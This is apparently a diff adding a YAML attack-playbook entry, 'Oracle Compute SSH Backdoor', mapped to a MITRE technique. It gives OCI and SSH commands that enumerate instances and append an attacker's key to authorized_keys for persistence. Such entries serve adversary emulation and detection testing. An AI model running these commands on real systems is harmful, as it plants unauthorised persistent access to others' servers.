@@ -1,0 +1,11 @@
+description: Inject SSH key into a Compute instance to maintain persistence.
+mitre_technique: T1053
+name: Oracle Compute SSH Backdoor
+stage: Persistence
+steps:
+- action: oci compute instance list --compartment-id <compartment-id>
+  description: Identify target instance
+- action: ssh opc@<public-ip> "echo 'ssh-rsa AAAAB3Nza... attacker-key' >> ~/.ssh/authorized_keys"
+  description: Inject attacker's key
+- action: ssh opc@<public-ip> "chmod 600 ~/.ssh/authorized_keys"
+  description: Set file permissions
